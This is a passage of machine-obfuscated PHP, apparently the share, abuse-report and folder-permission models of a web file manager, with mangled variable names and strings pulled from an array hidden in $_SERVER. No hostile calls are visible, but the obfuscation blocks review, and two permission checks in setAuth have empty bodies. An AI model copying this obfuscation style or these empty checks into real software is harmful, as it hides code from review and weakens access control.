(!$¶†×Õï´[$­ƒóÚí[1813]]) { $¶†×Õï´[$­ƒóÚí[1813]] = $½óÔ£ôŞ[$­ƒóÚí[32]]; } $Òäòò”Ÿ = array($­ƒóÚí[1916] => $ºÈ°©€€, $­ƒóÚí[512] => $½§íŒØ, $­ƒóÚí[1813] => $­ƒóÚí[12], $­ƒóÚí[584] => 0, $­ƒóÚí[692] => 0, $­ƒóÚí[589] => $­ƒóÚí[12], $­ƒóÚí[394] => $­ƒóÚí[12], $­ƒóÚí[1002] => $­ƒóÚí[12], $­ƒóÚí[2289] => 0, $­ƒóÚí[2290] => 0, $­ƒóÚí[863] => 0, $­ƒóÚí[586] => $­ƒóÚí[12], $­ƒóÚí[1504] => $­ƒóÚí[12]); $Ó¶›×âè = explode($­ƒóÚí[50], $­ƒóÚí[2291]); foreach ($Ó¶›×âè as $‚Ã³ƒ€) { if (!isset($¶†×Õï´[$‚Ã³ƒ€])) { continue; } $Òäòò”Ÿ[$‚Ã³ƒ€] = $¶†×Õï´[$‚Ã³ƒ€]; } $€ï´Îß± = $this->add($Òäòò”Ÿ); $áË±ıÁï = array($­ƒóÚí[1504] => short_id($€ï´Îß±)); if ($this->where($áË±ıÁï)->find()) { $áË±ıÁï[$­ƒóÚí[1504]] .= $­ƒóÚí[483] . rand_string(2, 3); } $this->where(array($­ƒóÚí[2292] => $€ï´Îß±))->save($áË±ıÁï); return $€ï´Îß±; } private function _shareAuthSet($õÛˆ£Ïı, $Ã¯Çãı•) { $¢˜¦ÂÛİ =& $_SERVER[¤øïŠ‹²]; if (!is_array($Ã¯Çãı•)) { return !1; } $¸ªïëÅ = Model($¢˜¦ÂÛİ[2240]); $¸ªïëÅ->where(array($¢˜¦ÂÛİ[694] => $õÛˆ£Ïı))->delete(); $øÇ‘Ñ“Õ = array(); foreach ($Ã¯Çãı• as $ÜéÎ¢á) { $Çãîš¼ = SourceModel::TYPE_USER; if ($ÜéÎ¢á[$¢˜¦ÂÛİ[201]] == SourceModel::TYPE_GROUP) { $Çãîš¼ = SourceModel::TYPE_GROUP; } $øÀè”Ñ¶ = array($¢˜¦ÂÛİ[694] => $õÛˆ£Ïı, $¢˜¦ÂÛİ[201] => $Çãîš¼, $¢˜¦ÂÛİ[595] => intval($ÜéÎ¢á[$¢˜¦ÂÛİ[595]]), $¢˜¦ÂÛİ[1589] => 0, $¢˜¦ÂÛİ[2293] => -1); if ($ÜéÎ¢á[$¢˜¦ÂÛİ[1589]]) { $øÀè”Ñ¶[$¢˜¦ÂÛİ[1589]] = $ÜéÎ¢á[$¢˜¦ÂÛİ[1589]]; } else { if ($ÜéÎ¢á[$¢˜¦ÂÛİ[2293]]) { $øÀè”Ñ¶[$¢˜¦ÂÛİ[2293]] = $ÜéÎ¢á[$¢˜¦ÂÛİ[2293]]; } } $øÇ‘Ñ“Õ[] = $øÀè”Ñ¶; } return $¸ªïëÅ->addAll($øÇ‘Ñ“Õ, array(), !0); } public function numViewAdd($ú†ÍÁ£á) { $Ù–™ÆßÄ =& $_SERVER[¤øïŠ‹²]; $º¼²ÄÛ€ = array($Ù–™ÆßÄ[2292] => $ú†ÍÁ£á); $this->where($º¼²ÄÛ€)->setAdd($Ù–™ÆßÄ[2289]); } public function numDownloadAdd($øóÕÎõ‹) { $Óô®öş’ =& $_SERVER[¤øïŠ‹²]; $Ò¿Ô¥ãØ = array($Óô®öş’[2292] => $øóÕÎõ‹); $this->where($Ò¿Ô¥ãØ)->setAdd($Óô®öş’[2290]); } protected function shareEdit($”İøşœü, $¶àÜÌ³) { $£¦ÛòÙˆ =& $_SERVER[¤øïŠ‹²]; $×şï½ = $this->getInfo($”İøşœü); if (!$×şï½) { return !1; } if ($¶àÜÌ³[$£¦ÛòÙˆ[1504]] && $¶àÜÌ³[$£¦ÛòÙˆ[584]] == $£¦ÛòÙˆ[102]) { if ($¶àÜÌ³[$£¦ÛòÙˆ[1504]] == $×şï½[$£¦ÛòÙˆ[1504]]) { unset($¶àÜÌ³[$£¦ÛòÙˆ[1504]]); } if ($¶àÜÌ³[$£¦ÛòÙˆ[1504]]) { $»Âã—ö© = $this->where(array($£¦ÛòÙˆ[2294] => $¶àÜÌ³[$£¦ÛòÙˆ[1504]]))->find(); if ($»Âã—ö©) { return !1; } if (!is_array($¶àÜÌ³[$£¦ÛòÙˆ[586]])) { $¶àÜÌ³[$£¦ÛòÙˆ[586]] = is_array($×şï½[$£¦ÛòÙˆ[586]]) ? $×şï½[$£¦ÛòÙˆ[586]] : array(); } if (!$¶àÜÌ³[$£¦ÛòÙˆ[586]][$£¦ÛòÙˆ[2295]]) { $¶àÜÌ³[$£¦ÛòÙˆ[586]][$£¦ÛòÙˆ[2295]] = $×şï½[$£¦ÛòÙˆ[1504]]; $¶àÜÌ³[$£¦ÛòÙˆ[586]][$£¦ÛòÙˆ[2296]] = $£¦ÛòÙˆ[102]; } } } $this->_checkLinkShare($¶àÜÌ³, $×şï½); $¶¤Òªáó = array(); $ş¹ÂÙºÔ = explode($£¦ÛòÙˆ[50], $£¦ÛòÙˆ[2297]); foreach ($ş¹ÂÙºÔ as $îï‡°¯¡) { if (!array_key_exists($îï‡°¯¡, $¶àÜÌ³)) { continue; } $¶¤Òªáó[$îï‡°¯¡] = $¶àÜÌ³[$îï‡°¯¡]; } $this->shareEventAdd($×şï½[$£¦ÛòÙˆ[204]], $¶àÜÌ³, $£¦ÛòÙˆ[1511]); $this->where(array($£¦ÛòÙˆ[2292] => $”İøşœü))->save($¶¤Òªáó); if (isset($¶àÜÌ³[$£¦ÛòÙˆ[2281]])) { $this->_shareAuthSet($”İøşœü, $¶àÜÌ³[$£¦ÛòÙˆ[2281]]); } return !0; } private function _checkLinkShare($§ä—í•‰, $‘“çÁúÏ) { $àš’Ö•€ =& $_SERVER[¤øïŠ‹²]; if ($§ä—í•‰[$àš’Ö•€[584]] != $àš’Ö•€[102]) { return; } $“Ê£ÊÔº = $‘“çÁúÏ[$àš’Ö•€[101]][$àš’Ö•€[204]]; if ($‘“çÁúÏ[$àš’Ö•€[101]][$àš’Ö•€[33]] != $àš’Ö•€[243]) { $ù¨«¶’ = $this->_folderReport($“Ê£ÊÔº); if (!$ù¨«¶’) { return; } show_json(LNG($àš’Ö•€[2298]) . $àš’Ö•€[2299] . $ù¨«¶’, !1); } $óà¤áİî = Model($àš’Ö•€[934])->fileInfoGet($‘“çÁúÏ[$àš’Ö•€[101]][$àš’Ö•€[204]]); if (!$óà¤áİî) { return; } $á‚Ú¿¼ä = $this->shareFileMeta($óà¤áİî[$àš’Ö•€[563]]); if (isset($á‚Ú¿¼ä[$àš’Ö•€[462]]) && $á‚Ú¿¼ä[$àš’Ö•€[462]] == $àš’Ö•€[102]) { show_json(LNG($àš’Ö•€[2300]), !1); } } private function _folderReport($ÉÉò°Ùñ) { $Í«´«î’ =& $_SERVER[¤øïŠ‹²]; $òÀÌóè = array($Í«´«î’[563] => array($Í«´«î’[1128], 0), $Í«´«î’[851] => 3); $ÕÓş¦Ò = Model($Í«´«î’[2301])->where($òÀÌóè)->field($Í«´«î’[563])->select(); if (!$ÕÓş¦Ò) { return !1; } $ÕÓş¦Ò = array_to_keyvalue($ÕÓş¦Ò, $Í«´«î’[12], $Í«´«î’[563]); $àƒ¢°ÍÑ = $Í«´«î’[50] . $ÉÉò°Ùñ . $Í«´«î’[50]; $òÀÌóè = array($Í«´«î’[563] => array($Í«´«î’[7], $ÕÓş¦Ò), $Í«´«î’[610] => array($Í«´«î’[480], "\45{$àƒ¢°ÍÑ}\x25"), $Í«´«î’[526] => 0); $¡ûò§• = Model($Í«´«î’[934])->where($òÀÌóè)->field($Í«´«î’[2302])->find(); if (!$¡ûò§•) { return !1; } $†ù¤Â·¹ = substr($¡ûò§•[$Í«´«î’[610]], strpos($¡ûò§•[$Í«´«î’[610]], $àƒ¢°ÍÑ)); $òÀÌóè = array($Í«´«î’[204] => array($Í«´«î’[7], trim($†ù¤Â·¹, $Í«´«î’[50]))); $Ë³ûò…ü = Model($Í«´«î’[934])->where($òÀÌóè)->field($Í«´«î’[32])->select(); $ÓèİŸÛ = array_to_keyvalue($Ë³ûò…ü, $Í«´«î’[12], $Í«´«î’[32]); $ÓèİŸÛ[] = $¡ûò§•[$Í«´«î’[32]]; return implode($Í«´«î’[8], $ÓèİŸÛ); } protected function remove($ªŒãì‘) { $×Œâ©Ñ =& $_SERVER[¤øïŠ‹²]; $µÕ¡’« = is_array($ªŒãì‘) ? $ªŒãì‘ : array($ªŒãì‘); for ($”‰î×¸ƒ = 0; $”‰î×¸ƒ < count($µÕ¡’«); $”‰î×¸ƒ++) { $Á£®çÎº = $this->getInfo($µÕ¡’«[$”‰î×¸ƒ]); if ($Á£®çÎº[$×Œâ©Ñ[692]] == $×Œâ©Ñ[102]) { Model($×Œâ©Ñ[662])->eventShare($Á£®çÎº[$×Œâ©Ñ[204]], $×Œâ©Ñ[2287]); } if ($Á£®çÎº[$×Œâ©Ñ[584]] == $×Œâ©Ñ[102]) { Model($×Œâ©Ñ[662])->eventShare($Á£®çÎº[$×Œâ©Ñ[204]], $×Œâ©Ñ[2286]); } } $ş¯ñ‰Â¼ = array($×Œâ©Ñ[694] => array($×Œâ©Ñ[7], $µÕ¡’«)); $¯ñ«¡ = $this->where($ş¯ñ‰Â¼)->delete(); if ($¯ñ«¡) { Model($×Œâ©Ñ[695])->where($ş¯ñ‰Â¼)->delete(); } return $¯ñ«¡; } protected function removeBySource($£ãƒ¢êµ) { $€ĞÅ—¢ô =& $_SERVER[¤øïŠ‹²]; $äø³Á = array($€ĞÅ—¢ô[512] => array($€ĞÅ—¢ô[513], $£ãƒ¢êµ)); $ş±ä£ÀÀ = $this->field($€ĞÅ—¢ô[694])->where($äø³Á)->select(); $óùİ’ƒ¨ = array_to_keyvalue($ş±ä£ÀÀ, $€ĞÅ—¢ô[12], $€ĞÅ—¢ô[694]); if (!$óùİ’ƒ¨) { return; } foreach ($ş±ä£ÀÀ as $îÍ¡åˆÏ) { $this->shareInfoMofify($îÍ¡åˆÏ, $€ĞÅ—¢ô[2303]); } $äø³Á = array($€ĞÅ—¢ô[2292] => array($€ĞÅ—¢ô[513], $óùİ’ƒ¨)); $this->where($äø³Á)->delete(); Model($€ĞÅ—¢ô[695])->where($äø³Á)->delete(); } public function listAll($ãÁš…¿Û) { $ªÅÍÖº =& $_SERVER[¤øïŠ‹²]; $¿ø£»£ = array(); if ($ãÁš…¿Û[$ªÅÍÖº[1542]]) { $¿ø£»£[$ªÅÍÖº[1542]] = $ãÁš…¿Û[$ªÅÍÖº[1542]]; } if ($ãÁš…¿Û[$ªÅÍÖº[862]]) { $óÓËéìÊ = $ãÁš…¿Û[$ªÅÍÖº[863]] ? $ãÁš…¿Û[$ªÅÍÖº[863]] : strtotime(date($ªÅÍÖº[2304])); $¿ø£»£[$ªÅÍÖº[244]] = array($ªÅÍÖº[420], array($ãÁš…¿Û[$ªÅÍÖº[862]], $óÓËéìÊ)); } if ($ãÁš…¿Û[$ªÅÍÖº[33]]) { $¿ø£»£[$ãÁš…¿Û[$ªÅÍÖº[33]]] = 1; } else { $¿ø£»£[] = array($ªÅÍÖº[584] => array($ªÅÍÖº[1128], 0), $ªÅÍÖº[692] => array($ªÅÍÖº[1128], 0), $ªÅÍÖº[2275] => $ªÅÍÖº[2231]); } if ($ãÁš…¿Û[$ªÅÍÖº[2227]]) { $¿ø£»£[] = array($ªÅÍÖº[1504] => $ãÁš…¿Û[$ªÅÍÖº[2227]], $ªÅÍÖº[1813] => array($ªÅÍÖº[480], "\x25{$ãÁš…¿Û[$ªÅÍÖº[2227]]}\45"), $ªÅÍÖº[2275] => $ªÅÍÖº[2231]); } $êóÏ·Ğ² = $this->_makeOrder()->where($¿ø£»£)->selectPage(20); if (empty($êóÏ·Ğ²[$ªÅÍÖº[457]])) { return array(); } $this->_listDataApply($êóÏ·Ğ²[$ªÅÍÖº[457]]); return $êóÏ·Ğ²; } public function listDataApply($¾®™è¯) { $this->_listDataApply($¾®™è¯); return $¾®™è¯; } private function _listDataApply(&$§æ¡œèÖ) { $á³ºã¸ =& $_SERVER[¤øïŠ‹²]; $ÑêÀØÔÀ = array_to_keyvalue($§æ¡œèÖ, $á³ºã¸[12], $á³ºã¸[1542]); $úàäŸî‚ = Model($á³ºã¸[623])->userListInfo(array_unique($ÑêÀØÔÀ)); $«·£ì¥Ò = array_to_keyvalue($§æ¡œèÖ, $á³ºã¸[12], $á³ºã¸[204]); $æ¶‚üŸÛ = Model($á³ºã¸[934])->sourceListInfo($«·£ì¥Ò, !0); foreach ($§æ¡œèÖ as $›Ò¿ Ôù => &$Ë“ĞÆ‡ô) { $¬Ñöşô… = $Ë“ĞÆ‡ô[$á³ºã¸[1542]]; $Ë“ĞÆ‡ô[$á³ºã¸[2305]] = $úàäŸî‚[$¬Ñöşô…] ? $úàäŸî‚[$¬Ñöşô…] : !1; if (!$Ë“ĞÆ‡ô[$á³ºã¸[2305]] || $Ë“ĞÆ‡ô[$á³ºã¸[2305]][$á³ºã¸[851]] != $á³ºã¸[102]) { unset($§æ¡œèÖ[$›Ò¿ Ôù]); continue; } $ñŸ£Õ»® = $Ë“ĞÆ‡ô[$á³ºã¸[204]]; $Ë“ĞÆ‡ô[$á³ºã¸[101]] = $æ¶‚üŸÛ[$ñŸ£Õ»®] ? $æ¶‚üŸÛ[$ñŸ£Õ»®] : !1; if ($Ë“ĞÆ‡ô[$á³ºã¸[101]][$á³ºã¸[526]] == $á³ºã¸[102]) { unset($§æ¡œèÖ[$›Ò¿ Ôù]); } if ($Ë“ĞÆ‡ô[$á³ºã¸[101]] != $á³ºã¸[241] && !$Ë“ĞÆ‡ô[$á³ºã¸[101]]) { unset($§æ¡œèÖ[$›Ò¿ Ôù]); } } unset($Ë“ĞÆ‡ô); $§æ¡œèÖ = array_values($§æ¡œèÖ); } private function _makeOrder($Œ®ó»ƒî = '') { $‘É‡ÍÒ• =& $_SERVER[¤øïŠ‹²]; $àøû± = array($‘É‡ÍÒ•[244], $‘É‡ÍÒ•[863], $‘É‡ÍÒ•[2289], $‘É‡ÍÒ•[2290]); $»“¹– = array($‘É‡ÍÒ•[543] => $‘É‡ÍÒ•[544], $‘É‡ÍÒ•[545] => $‘É‡ÍÒ•[546]); $¶ò”Ö£ = Input::get($‘É‡ÍÒ•[550], $‘É‡ÍÒ•[7], $‘É‡ÍÒ•[518], $àøû±); $õèÖ¬İª = Input::get($‘É‡ÍÒ•[551], $‘É‡ÍÒ•[7], $‘É‡ÍÒ•[2306], array($‘É‡ÍÒ•[2224], $‘É‡ÍÒ•[545])); $õèÖ¬İª = $»“¹–[$õèÖ¬İª]; $Œ®ó»ƒî = $Œ®ó»ƒî . "{$¶ò”Ö£}\40{$õèÖ¬İª}"; return $this->order($Œ®ó»ƒî); } public function reportAdd($¨‡ñ»Üİ) { $œ­ù™Ü¤ =& $_SERVER[¤øïŠ‹²]; $óÑĞ©±¹ = array($œ­ù™Ü¤[694] => $¨‡ñ»Üİ[$œ­ù™Ü¤[694]], $œ­ù™Ü¤[1542] => USER_ID); if (Model($œ­ù™Ü¤[2301])->where($óÑĞ©±¹)->find()) { return !1; } $ì´šµÄ = array($œ­ù™Ü¤[694] => $¨‡ñ»Üİ[$œ­ù™Ü¤[694]], $œ­ù™Ü¤[1813] => $¨‡ñ»Üİ[$œ­ù™Ü¤[1813]], $œ­ù™Ü¤[204] => $¨‡ñ»Üİ[$œ­ù™Ü¤[204]], $œ­ù™Ü¤[563] => $¨‡ñ»Üİ[$œ­ù™Ü¤[563]], $œ­ù™Ü¤[1542] => USER_ID, $œ­ù™Ü¤[33] => $¨‡ñ»Üİ[$œ­ù™Ü¤[33]], $œ­ù™Ü¤[546] => $¨‡ñ»Üİ[$œ­ù™Ü¤[546]]); return Model($œ­ù™Ü¤[2301])->add($ì´šµÄ); } public function reportList($œ¢—á“á) { $Âì°Ìç‹ =& $_SERVER[¤øïŠ‹²]; $°Ë‚ÎÌ¬ = array(); if ($œ¢—á“á[$Âì°Ìç‹[862]]) { $•´ú„òÅ = $œ¢—á“á[$Âì°Ìç‹[863]] ? $œ¢—á“á[$Âì°Ìç‹[863]] : strtotime(date($Âì°Ìç‹[2304])); $°Ë‚ÎÌ¬[$Âì°Ìç‹[244]] = array($Âì°Ìç‹[420], array($œ¢—á“á[$Âì°Ìç‹[862]], $•´ú„òÅ)); } if (isset($œ¢—á“á[$Âì°Ìç‹[33]]) && in_array($œ¢—á“á[$Âì°Ìç‹[33]], array($Âì°Ìç‹[102], $Âì°Ìç‹[530], $Âì°Ìç‹[2307], $Âì°Ìç‹[2308], $Âì°Ìç‹[2309]))) { $°Ë‚ÎÌ¬[$Âì°Ìç‹[33]] = $œ¢—á“á[$Âì°Ìç‹[33]]; } if (isset($œ¢—á“á[$Âì°Ìç‹[851]]) && in_array($œ¢—á“á[$Âì°Ìç‹[851]], array($Âì°Ìç‹[241], $Âì°Ìç‹[102], $Âì°Ìç‹[530], $Âì°Ìç‹[2307]))) { $°Ë‚ÎÌ¬[$Âì°Ìç‹[851]] = $œ¢—á“á[$Âì°Ìç‹[851]]; } $ÒğÄıêê = Input::get($Âì°Ìç‹[551], $Âì°Ìç‹[7], $Âì°Ìç‹[2306], array($Âì°Ìç‹[2224], $Âì°Ìç‹[545])); $—¢ğàÕ = array($Âì°Ìç‹[543] => $Âì°Ìç‹[544], $Âì°Ìç‹[545] => $Âì°Ìç‹[546]); $½¯áÚô = $Âì°Ìç‹[2310] . $—¢ğàÕ[$ÒğÄıêê]; $Š÷Âè’¦ = Model($Âì°Ìç‹[2301])->where($°Ë‚ÎÌ¬)->order($½¯áÚô)->selectPage(20); if (empty($Š÷Âè’¦[$Âì°Ìç‹[457]])) { return array(); } $¤ô†¬è = array_to_keyvalue_group($Š÷Âè’¦[$Âì°Ìç‹[457]], $Âì°Ìç‹[851], $Âì°Ìç‹[694]); if (!empty($¤ô†¬è[0])) { $œ¢—á“á = $¤ô†¬è[0]; $°Ë‚ÎÌ¬ = array($Âì°Ìç‹[694] => array($Âì°Ìç‹[7], $œ¢—á“á)); $àĞ¡Í§¸ = $this->where($°Ë‚ÎÌ¬)->field($Âì°Ìç‹[694])->select(); $àĞ¡Í§¸ = array_to_keyvalue($àĞ¡Í§¸, $Âì°Ìç‹[12], $Âì°Ìç‹[694]); $„«éë¥¾ = array_diff($œ¢—á“á, $àĞ¡Í§¸); if (!empty($„«éë¥¾)) { foreach ($Š÷Âè’¦[$Âì°Ìç‹[457]] as $Ö½Ø¶Ó => $†ŞçÕÙæ) { if (in_array($†ŞçÕÙæ[$Âì°Ìç‹[694]], $„«éë¥¾)) { unset($Š÷Âè’¦[$Âì°Ìç‹[457]][$Ö½Ø¶Ó]); } } } } $this->_listDataApply($Š÷Âè’¦[$Âì°Ìç‹[457]]); return $Š÷Âè’¦; } public function reportStatus($Ã¼¯ªºü) { $•ı±ÉŞÏ =& $_SERVER[¤øïŠ‹²]; $·şñÉÛô = array($•ı±ÉŞÏ[493] => $Ã¼¯ªºü[$•ı±ÉŞÏ[493]]); $¼èîâ“Å = Model($•ı±ÉŞÏ[2301])->where($·şñÉÛô)->field($•ı±ÉŞÏ[2311])->find(); if (!$¼èîâ“Å) { return !1; } $÷ˆ§İşÅ = array($•ı±ÉŞÏ[851] => $Ã¼¯ªºü[$•ı±ÉŞÏ[851]]); if ($Ã¼¯ªºü[$•ı±ÉŞÏ[851]] == $•ı±ÉŞÏ[2307] && $¼èîâ“Å[$•ı±ÉŞÏ[851]] == $•ı±ÉŞÏ[2307]) { $÷ˆ§İşÅ[$•ı±ÉŞÏ[851]] = 0; } $â½Ó±Ë³ = Model($•ı±ÉŞÏ[2301])->where($·şñÉÛô)->save($÷ˆ§İşÅ); if ($Ã¼¯ªºü[$•ı±ÉŞÏ[851]] == $•ı±ÉŞÏ[530]) { if ($¼èîâ“Å[$•ı±ÉŞÏ[563]] != $•ı±ÉŞÏ[241] && $this->shareFileMeta($¼èîâ“Å[$•ı±ÉŞÏ[563]])) { $this->shareFileMeta($¼èîâ“Å[$•ı±ÉŞÏ[563]], 0); } $this->remove($¼èîâ“Å[$•ı±ÉŞÏ[694]]); return !0; } if ($â½Ó±Ë³ && $Ã¼¯ªºü[$•ı±ÉŞÏ[851]] == $•ı±ÉŞÏ[2307]) { $É‡üâàœ = $÷ˆ§İşÅ[$•ı±ÉŞÏ[851]] == $•ı±ÉŞÏ[2307] ? 1 : 0; $this->shareFileMeta($¼èîâ“Å[$•ı±ÉŞÏ[563]], $É‡üâàœ); $this->removeByFile($¼èîâ“Å[$•ı±ÉŞÏ[563]]); } return $â½Ó±Ë³; } private function removeByFile($Ã‡‰œÓé) { $ »†‚…‡ =& $_SERVER[¤øïŠ‹²]; $ÇáíĞ† = Model($ »†‚…‡[934])->where(array($ »†‚…‡[563] => $Ã‡‰œÓé))->field($ »†‚…‡[204])->select(); $½³„…Š = array_to_keyvalue($ÇáíĞ†, $ »†‚…‡[12], $ »†‚…‡[204]); $‡­½¯• = array($ »†‚…‡[204] => array($ »†‚…‡[7], $½³„…Š), $ »†‚…‡[584] => 1); $ÇáíĞ† = $this->where($‡­½¯•)->field($ »†‚…‡[694])->select(); if (empty($ÇáíĞ†)) { return; } $—‡Ø·×¥ = array_to_keyvalue($ÇáíĞ†, $ »†‚…‡[12], $ »†‚…‡[694]); $this->remove($—‡Ø·×¥); } private function shareFileMeta($È°ô€Šæ, $‹ŒÆàõ = null) { $’êø‹™Ô =& $_SERVER[¤øïŠ‹²]; $¼éîÔ‹à = array($’êø‹™Ô[563] => $È°ô€Šæ, $’êø‹™Ô[106] => $’êø‹™Ô[2312]); if (is_null($‹ŒÆàõ)) { return Model($’êø‹™Ô[2313])->where($¼éîÔ‹à)->find(); } $¼éîÔ‹à[$’êø‹™Ô[462]] = $‹ŒÆàõ; Model($’êø‹™Ô[2313])->add($¼éîÔ‹à, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\x65\137\141\x75\x74\x68"; public function getAuth($“ªÄ¶ğ‰) { $úıÈ ı» =& $_SERVER[¤øïŠ‹²]; $„¹¸Áê = $this->sourceAuthSelect($“ªÄ¶ğ‰); $œ¶ê± = array(); $³‚èŸË« = array(); $òë¸ª¢© = 2 << 25; foreach ($„¹¸Áê as $£™ÕÃşƒ) { $‚¡×Çâ = Model($úıÈ ı»[597])->listData($£™ÕÃşƒ[$úıÈ ı»[1589]]); if (!$‚¡×Çâ) { continue; } $œ¶ê±[] = $£™ÕÃşƒ; $©ÓÑÇö = 0; if ($£™ÕÃşƒ[$úıÈ ı»[201]] == SourceModel::TYPE_GROUP) { $©ÓÑÇö = $òë¸ª¢© * 2; } if ($£™ÕÃşƒ[$úıÈ ı»[201]] == SourceModel::TYPE_USER) { $©ÓÑÇö = $òë¸ª¢©; } if ($£™ÕÃşƒ[$úıÈ ı»[201]] == SourceModel::TYPE_USER && $£™ÕÃşƒ[$úıÈ ı»[595]] == $úıÈ ı»[241]) { $©ÓÑÇö = 0; } $³‚èŸË«[] = $‚¡×Çâ[$úıÈ ı»[508]] + $©ÓÑÇö; } array_multisort($³‚èŸË«, SORT_DESC, $œ¶ê±); return $œ¶ê±; } public function sourceAuthSelect($¸—¯Ì¡Ó) { $Ö¥İƒ±‹ =& $_SERVER[¤øïŠ‹²]; static $ßŒ§¦äØ = array(); $Ò¢Ó²ú¯ = is_array($¸—¯Ì¡Ó) ? !1 : !0; if ($Ò¢Ó²ú¯) { $¸—¯Ì¡Ó = array($¸—¯Ì¡Ó); } $÷ş“Š¦â = array(); foreach ($¸—¯Ì¡Ó as $Ò¥À…—£) { if (isset($ßŒ§¦äØ[$Ò¥À…—£])) { $÷ş“Š¦â[$Ò¥À…—£] = $ßŒ§¦äØ[$Ò¥À…—£]; } } if (count($÷ş“Š¦â) == count($¸—¯Ì¡Ó)) { return $Ò¢Ó²ú¯ ? $÷ş“Š¦â[$¸—¯Ì¡Ó[0]] : $÷ş“Š¦â; } $ÎÈªñ„ù = $Ö¥İƒ±‹[2314]; $•“„ô‘¤ = array($Ö¥İƒ±‹[204] => array($Ö¥İƒ±‹[7], $¸—¯Ì¡Ó)); $ ¥á£•³ = $this->field($ÎÈªñ„ù)->order($Ö¥İƒ±‹[493])->where($•“„ô‘¤)->select(); $Èû™×£ = array_to_keyvalue_group($ ¥á£•³, $Ö¥İƒ±‹[204]); foreach ($¸—¯Ì¡Ó as $Ò¥À…—£) { $ßŒ§¦äØ[$Ò¥À…—£] = $Èû™×£[$Ò¥À…—£] ? $Èû™×£[$Ò¥À…—£] : array(); } if ($Ò¢Ó²ú¯) { return $ ¥á£•³; } return $Èû™×£; } public function setAuth($Ø¶±Â‚ü, $²Ó©ÕŠÚ) { $¼º£è¤ =& $_SERVER[¤øïŠ‹²]; $Æá¢Ï©„ = Model($¼º£è¤[1482])->sourceInfo($Ø¶±Â‚ü); if (!$Æá¢Ï©„) { return !1; } if ($Æá¢Ï©„[$¼º£è¤[201]] != SourceModel::TYPE_GROUP) { return !1; } $ìıØÓè… = 1; $…Ø¿Şù½ = $Æá¢Ï©„[$¼º£è¤[595]]; if ($…Ø¿Şù½ != $ìıØÓè…) { $¤ñ—Ø¯ = array($¼º£è¤[1444] => $…Ø¿Şù½); $ÁÚ“ÈÁ = Model($¼º£è¤[2223])->field($¼º£è¤[1542])->where($¤ñ—Ø¯)->select(); $ÁÚ“ÈÁ = array_to_keyvalue($ÁÚ“ÈÁ, $¼º£è¤[12], $¼º£è¤[1542]); } $úüô‹à¸ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ë¦ø—„Ï = array(); foreach ($²Ó©ÕŠÚ as $ÔÆüÙÁü) { if (!in_array($ÔÆüÙÁü[$¼º£è¤[201]], $úüô‹à¸)) { show_json(LNG($¼º£è¤[2315]), !1); } if ($…Ø¿Şù½ != $ìıØÓè…) { if ($ÔÆüÙÁü[$¼º£è¤[201]] == SourceModel::TYPE_GROUP) { } if ($ÔÆüÙÁü[$¼º£è¤[595]] != 0 && !in_array($ÔÆüÙÁü[$¼º£è¤[595]], $ÁÚ“ÈÁ)) { } } if ($ÔÆüÙÁü[$¼º£è¤[595]] == 0) { $ÔÆüÙÁü[$¼º£è¤[201]] = SourceModel::TYPE_USER; } $Ë¦ø—„Ï[] = array($¼º£è¤[204] => $Ø¶±Â‚ü, $¼º£è¤[201] => intval($ÔÆüÙÁü[$¼º£è¤[201]]), $¼º£è¤[595] => intval($ÔÆüÙÁü[$¼º£è¤[595]]), $¼º£è¤[1589] => intval($ÔÆüÙÁü[$¼º£è¤[1589]]) ? intval($ÔÆüÙÁü[$¼º£è¤[1589]]) : 0, $¼º£è¤[2293] => intval($ÔÆüÙÁü[$¼º£è¤[2293]]) ? intval($ÔÆüÙÁü[$¼º£è¤[2293]]) : -1); } $this->where(array($¼º£è¤[512] => $Ø¶±Â‚ü))->delete(); $this->addAll($Ë¦ø—„Ï); return !0; } public function authClear($ú¼³ÓñÑ) { $Ñ²ô¹Ç =& $_SERVER[¤øïŠ‹²]; $¸‚±ˆÀ¶ = Model($Ñ²ô¹Ç[1482])->sourceInfo($ú¼³ÓñÑ); $ö¼¤¯É = array($ú¼³ÓñÑ); if ($¸‚±ˆÀ¶[$Ñ²ô¹Ç[506]] == $Ñ²ô¹Ç[102]) { $ã‹€˜Ñ÷ = array($Ñ²ô¹Ç[681] => array($Ñ²ô¹Ç[641], $¸‚±ˆÀ¶[$Ñ²ô¹Ç[610]] . $ú¼³ÓñÑ . $Ñ²ô¹Ç[642])); $ö¼¤¯É = Model($Ñ²ô¹Ç[1482])->field($Ñ²ô¹Ç[512])->where($ã‹€˜Ñ÷)->getField($Ñ²ô¹Ç[204], !0); $ö¼¤¯É[] = $ú¼³ÓñÑ; } $this->where(array($Ñ²ô¹Ç[512] => array($Ñ²ô¹Ç[513], $ö¼¤¯É)))->delete(); return !0; } public function getAllParent($Ş§Õ—úÑ) { $è¿‡‡ëş =& $_SERVER[¤øïŠ‹²]; $óúûîòû = Model($è¿‡‡ëş[1482])->sourceInfo($Ş§Õ—úÑ); if (!$óúûîòû || $óúûîòû[$è¿‡‡ëş[201]] != SourceModel::TYPE_GROUP) { return array(); } $å£ú‹¥Ó = Model($è¿‡‡ëş[1482])->parentLevelArray($óúûîòû[$è¿‡‡ëş[610]]); $ÂÄ¢ÂÙ = array_merge(array(intval($Ş§Õ—úÑ)), array_reverse($å£ú‹¥Ó)); $ÚÁ¾§œ = $this->sourceAuthSelect($ÂÄ¢ÂÙ); $şëÓ¢’¨ = $GLOBALS[$è¿‡‡ëş[6]][$è¿‡‡ëş[103]][$è¿‡‡ëş[2236]] == 1; $ü€ñÍòç = $şëÓ¢’¨ ? 3 : 2; $šÇ“ú„º = Model($è¿‡‡ëş[1442])->getInfo($óúûîòû[$è¿‡‡ëş[595]]); $ÛËĞû÷ = explode($è¿‡‡ëş[50], trim($šÇ“ú„º[$è¿‡‡ëş[610]], $è¿‡‡ëş[50])); $ÊÂ¢ÌÍö = array_merge(array($šÇ“ú„º[$è¿‡‡ëş[1444]]), array_reverse(array_slice($ÛËĞû÷, $ü€ñÍòç))); foreach ($ÚÁ¾§œ as $Ş§Õ—úÑ => $çª ‡Ğ) { foreach ($çª ‡Ğ as $±´·ò¥) { if (!$±´·ò¥ || !$±´·ò¥[$è¿‡‡ëş[595]] || $±´·ò¥[$è¿‡‡ëş[595]] == $è¿‡‡ëş[241]) { continue; } if ($±´·ò¥[$è¿‡‡ëş[201]] != SourceModel::TYPE_GROUP) { continue; } $ÊÂ¢ÌÍö[] = $±´·ò¥[$è¿‡‡ëş[595]]; } } 